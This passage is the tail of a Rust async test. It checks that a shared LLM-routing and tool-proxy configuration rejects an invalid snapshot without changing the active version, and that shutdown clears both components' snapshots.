    stop.store(true, std::sync::atomic::Ordering::Relaxed);
    for r in readers {
        r.join().unwrap();
    }
    // A rejected snapshot changes nothing anywhere.
    let mut bad = snapshot(&s, &provider, 1, std::path::Path::new("/nonexistent"));
    bad.version = 41;
    bad.routes[0].provider = "gemini".into();
    assert!(shared.apply(bad).await.is_err());
    assert_eq!(shared.llm.snapshots().load().map(|l| l.version), Some(40));
    assert_eq!(shared.tool_proxy.status().snapshot_version, Some(40));
    shared.shutdown();
    assert!(shared.llm.snapshots().load().is_none());
    assert!(shared.tool_proxy.status().snapshot_version.is_none());
}
